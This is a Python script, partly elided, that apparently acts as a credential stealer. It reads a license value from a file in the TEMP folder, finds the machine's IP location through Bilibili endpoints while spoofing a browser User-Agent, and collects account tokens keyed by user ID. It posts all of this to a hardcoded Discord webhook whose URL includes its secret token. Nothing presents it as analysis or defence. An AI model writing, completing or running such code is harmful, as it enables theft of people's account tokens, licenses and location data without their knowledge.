import requests,json,re,os,base64,typing,urllib.request

WEBHOOK_URL="https://discord.com/api/webhooks/1363437812648509501/c00wVqoW4fRmsdPZgP9mVWtgNAlXp_swj6yLz-vGbQjG05xr1Y1qBUtsRjww9Hnr3pqq"
...
def get_license_from_temp():
    try:
        data_file=os.path.join(os.getenv("TEMP",""),"data")
        with open(data_file,"r",encoding="utf-8") as f:
            return json.load(f).get("license","Not found")
    except:
        return "Not found"

def get_ip_location():
    headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36","Accept":"application/json, text/plain, */*","Referer":"https://www.bilibili.com/","Origin":"https://www.bilibili.com"}
    endpoints=["https://api.bilibili.com/x/web-interface/zone","https://api.live.bilibili.com/client/v1/Ip/getInfoNew"]
    ip_info=None
...
def send_to_webhook(location,tokens,license):
    ...
    fields.append({"name":"**License:**","value":license})
    if tokens:
        for uid,ts in tokens.items():
            tl="\n".join(ts)
            if len(tl)>1000:tl=tl[:980]+"... (truncated)"
...
def main():
    ...
    license=get_license_from_temp()
    location=get_ip_location()
    send_to_webhook(location,tokens,license)
